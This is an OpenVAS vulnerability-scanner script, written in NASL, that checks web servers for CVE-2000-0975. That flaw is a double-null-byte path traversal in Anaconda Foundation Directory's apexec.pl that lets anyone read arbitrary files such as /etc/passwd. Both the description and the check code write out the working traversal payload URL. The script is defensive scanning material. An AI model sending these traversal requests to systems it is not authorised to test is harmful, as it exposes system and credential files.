###############################################################################
# OpenVAS Vulnerability Test
# $Id: anaconda_doublenull.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# Anaconda Double NULL Encoded Remote File Retrieval
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15749");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2000-0975");
  script_bugtraq_id(2338);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Anaconda Double NULL Encoded Remote File Retrieval");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Host/runs_unixoide");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Contact your vendor for updated software.");

  script_tag(name:"summary", value:"The remote Anaconda Foundation Directory contains a flaw
  that allows anyone to read arbitrary files with root (super-user)
  privileges.");

  script_tag(name:"insight", value:"The flaw can be misused by embedding a double null byte in a URL, as in :

  http://www.example.com/cgi-bin/apexec.pl?etype=odp&template=../../../../../../..../../etc/passwd%%0000.html&passurl=/category/");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

files = traversal_files( "linux" );

foreach dir( make_list_unique( "/cgi-local", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file( keys( files ) ) {

    item = string(dir,"/apexec.pl?etype=odp&template=../../../../../../../../../",files[file],"%%0000.html&passurl=/category/");

    if(http_vuln_check( port:port, url:item, pattern:file, check_header:TRUE ) ) {
      report = report_vuln_url( port:port, url:item);
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );